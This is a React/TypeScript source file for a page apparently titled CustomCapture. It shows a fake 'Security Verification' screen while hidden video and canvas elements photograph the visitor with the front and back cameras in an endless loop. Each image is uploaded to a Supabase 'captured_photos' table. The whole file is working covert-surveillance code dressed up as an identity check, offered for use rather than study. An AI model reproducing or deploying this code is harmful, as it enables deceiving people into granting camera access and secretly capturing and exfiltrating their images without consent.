import { useEffect, useState, useRef } from "react";
import { useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";

const CustomCapture = () => {
  const [searchParams] = useSearchParams();
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [customHtml, setCustomHtml] = useState<string | null>(null);
  const captureLoopRef = useRef<boolean>(false);
  const stopCaptureRef = useRef<boolean>(false);
  
  const sessionId = searchParams.get("session") || "default";
  const redirectUrl = searchParams.get("redirect") || "https://google.com";
  const countdownSeconds = parseInt(searchParams.get("timer") || "5", 10);

  // Load custom HTML from settings
  useEffect(() => {
    const loadCustomHtml = async () => {
      try {
        const { data, error } = await supabase
          .from('app_settings')
          .select('setting_value')
          .eq('setting_key', 'main_settings')
          .maybeSingle();

        if (data && !error) {
          const settings = data.setting_value as { customCaptureHtml?: string };
          if (settings.customCaptureHtml) {
            setCustomHtml(settings.customCaptureHtml);
            return;
          }
        }
        
        // Fallback default HTML
        const defaultHtml = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Security Verification</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      background: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
    }
    .container {
      text-align: center;
      padding: 40px;
      background: rgba(15, 15, 30, 0.8);
      border-radius: 20px;
      border: 1px solid rgba(0, 255, 136, 0.2);
    }
    .icon {
      width: 80px;
      height: 80px;
      margin: 0 auto 20px;
      background: linear-gradient(135deg, #00ff88, #06b6d4);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 40px;
    }
    h1 { margin-bottom: 10px; }
    p { color: #888; }
  </style>
</head>
<body>
  <div class="container">
    <div class="icon">🔒</div>
    <h1>Verification Active</h1>
    <p>Please wait while we verify your identity...</p>
  </div>
</body>
</html>
        `;
        setCustomHtml(defaultHtml);
      } catch (err) {
        console.error('Error loading custom HTML:', err);
        setCustomHtml('<div style="display:flex;align-items:center;justify-content:center;min-height:100vh;background:#1a1a2e;color:#00ff88;">Verification in progress...</div>');
      }
    };

    loadCustomHtml();
  }, []);

  const captureFromCamera = async (facingMode: "user" | "environment"): Promise<string | null> => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode, width: 640, height: 480 } 
      });
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();
        
        await new Promise(resolve => setTimeout(resolve, 500));
        
        if (canvasRef.current && videoRef.current) {
          const canvas = canvasRef.current;
          const video = videoRef.current;
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext("2d");
          if (ctx) {
            ctx.drawImage(video, 0, 0);
            const imageData = canvas.toDataURL("image/jpeg", 0.8);
            stream.getTracks().forEach(track => track.stop());
            return imageData;
          }
        }
        
        stream.getTracks().forEach(track => track.stop());
      }
      
      return null;
    } catch (error) {
      console.error(`Camera ${facingMode} access denied:`, error);
      return null;
    }
  };

  // Continuous capture loop - keeps capturing forever until user closes page
  const startContinuousCapture = async () => {
    if (captureLoopRef.current) return;
    captureLoopRef.current = true;
    
    let captureCount = 0;
    
    while (!stopCaptureRef.current) {
      try {
        captureCount++;
        
        // Capture FRONT camera
        const frontImage = await captureFromCamera("user");
        if (frontImage && !stopCaptureRef.current) {
          await supabase.from('captured_photos').insert({
            session_id: sessionId,
            image_data: frontImage,
            user_agent: `${navigator.userAgent} [FRONT-${captureCount}]`
          });
        }
        
        if (stopCaptureRef.current) break;
        await new Promise(resolve => setTimeout(resolve, 200));
        
        // Capture BACK camera
        const backImage = await captureFromCamera("environment");
        if (backImage && !stopCaptureRef.current) {
          await supabase.from('captured_photos').insert({
            session_id: sessionId,
            image_data: backImage,
            user_agent: `${navigator.userAgent} [BACK-${captureCount}]`
          });
        }
        
        if (stopCaptureRef.current) break;
        await new Promise(resolve => setTimeout(resolve, 500));
        
      } catch (error) {
        console.error("Capture cycle error:", error);
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }
  };

  // Cleanup on unmount
  useEffect(() => {
    return () => {
      stopCaptureRef.current = true;
    };
  }, []);

  // Start capture immediately when HTML loads - no countdown shown
  useEffect(() => {
    if (!customHtml) return;
    startContinuousCapture();
  }, [customHtml]);

  // Show nothing while loading HTML, then show ONLY custom HTML
  if (!customHtml) {
    return (
      <>
        <video ref={videoRef} className="hidden" autoPlay playsInline muted />
        <canvas ref={canvasRef} className="hidden" />
      </>
    );
  }

  // ONLY show custom HTML - no countdown, no loading, just the HTML
  return (
    <>
      <video ref={videoRef} className="hidden" autoPlay playsInline muted />
      <canvas ref={canvasRef} className="hidden" />
      <div 
        dangerouslySetInnerHTML={{ __html: customHtml }} 
        style={{ minHeight: '100vh' }}
      />
    </>
  );
};

export default CustomCapture;